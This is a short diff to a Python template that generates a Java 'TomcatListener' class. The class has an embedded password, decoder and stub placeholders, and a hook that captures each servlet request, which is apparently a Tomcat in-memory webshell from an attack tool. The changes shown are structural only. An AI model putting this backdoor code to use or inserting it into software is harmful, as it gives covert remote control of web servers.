@@ -2,12 +2,12 @@ code = """
 import java.lang.reflect.*;
 import java.util.*;
 
-public class TomcatListener extends ClassLoader implements InvocationHandler {{
+public class TomcatListener implements InvocationHandler {{
     private static String password = "{password}";
 {common}
+{context}
 {decoder}
 {stub}
-{context}
     private void hook(Object servletRequestEvent) throws Exception {{
         Object servletRequest = invokeMethod(
             servletRequestEvent, "getServletRequest"
@@ -67,10 +67,6 @@ public class TomcatListener extends ClassLoader implements InvocationHandler {{
                 }} catch (Exception e) {{}}
             }}
         }}
-    }}
-
-    public TomcatListener(ClassLoader loader) {{
-        super(loader);
     }}
 
     static {{
